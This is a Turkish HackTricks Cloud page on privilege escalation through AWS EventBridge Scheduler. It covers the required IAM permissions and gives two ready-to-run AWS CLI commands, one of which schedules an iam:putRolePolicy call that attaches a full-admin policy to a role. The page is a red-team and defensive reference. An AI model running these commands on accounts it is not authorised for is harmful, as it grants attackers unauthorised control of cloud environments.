# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler, çeşitli AWS hizmetlerine çağrılar planlayarak ayrıcalık yükseltmek için kullanılabilir. Planlı bir şekilde hizmetleri çağırma yeteneğinden yararlanarak, yeterli izinlere sahip kullanıcılar ayrıcalıkları yükseltebilir. İşte EventBridge Scheduler'ın şablon hedefleri kullanarak tetikleyebileceği bazı temel eylemler:

- Lambda: lambda:InvokeFunction - Lambda fonksiyonlarını bir program dahilinde çağırın.
- CodeBuild: codebuild:StartBuild - AWS CodeBuild projelerini başlatın.
- CodePipeline: codepipeline:StartPipelineExecution - AWS CodePipeline yürütmelerini tetikleyin.
- ECS: ecs:RunTask - ECS görevlerini çalıştırın.
- EventBridge: events:PutEvents - EventBridge'e olaylar ekleyin.
- Inspector: inspector:StartAssessmentRun - Amazon Inspector değerlendirmelerini başlatın.
- Kinesis: kinesis:PutRecord - Kinesis akışlarına kayıt ekleyin.
- Firehose: firehose:PutRecord - Firehose teslim akışlarına kayıt ekleyin.
- SageMaker: sagemaker:StartPipelineExecution - SageMaker boru hattı yürütmelerini başlatın.
- SNS: sns:Publish - SNS konularına mesaj yayınlayın.
- SQS: sqs:SendMessage - SQS kuyruklarına mesaj gönderin.
- Step Functions: states:StartExecution - AWS Step Functions yürütmelerini başlatın.

Bunlar, EventBridge Scheduler'ın gerçekleştirebileceği şablon eylemlerden sadece birkaçıdır. Ancak, evrensel hedefler kullanarak, AWS hizmetleri arasında birçok başka eylem de tetiklenebilir. Evrensel hedefler, şablonlu listenin ötesinde daha kapsamlı API işlemlerine olanak tanır.

EventBridge Scheduler hakkında daha fazla bilgi için:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

`sts:AssumeRole`, `iam:PassRole` ve `scheduler:CreateSchedule veya scheduler:UpdateSchedule` izinlerine sahip kullanıcılar, daha yüksek ayrıcalıklara sahip bir rol kullanarak EventBridge Scheduler'ı hizmetleri çağırmak için kullanarak ayrıcalıkları yükseltebilir.

Bu izinlerle, bir saldırgan, yükseltilmiş ayrıcalıklara sahip bir rolü üstlenebilir ve bir program oluştururken veya güncellerken bu rolü EventBridge Scheduler'a geçirebilir. Program, daha önce listelenen herhangi bir eylemi gerçekleştirecek şekilde yapılandırılabilir; örneğin, Lambda fonksiyonlarını çağırmak, ECS görevlerini başlatmak, CodePipeline yürütmelerini tetiklemek veya EventBridge Scheduler tarafından desteklenen 270 AWS hizmetinden herhangi birinin işlemini gerçekleştirmek. Bu eylemleri planlayarak, bir saldırgan, AWS hizmetleri arasında yetkisiz işlemler gerçekleştirmek için daha yüksek ayrıcalıkları kötüye kullanabilir.
\\

Örneğin, programı bir şablon eylemi olan bir Lambda fonksiyonunu çağıracak şekilde yapılandırabilirler:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
EventBridge Scheduler'da şablonlu hizmet eylemlerine ek olarak, birçok AWS hizmeti için geniş bir API işlemleri yelpazesini çağırmak üzere evrensel hedefler kullanabilirsiniz. Evrensel hedefler, neredeyse her API'yi çağırma esnekliği sunar. Bir örnek, "putRolePolicy" politikasına sahip bir rol kullanarak "AdminAccessPolicy" eklemek için evrensel hedeflerin kullanılabilir.
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Referanslar

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
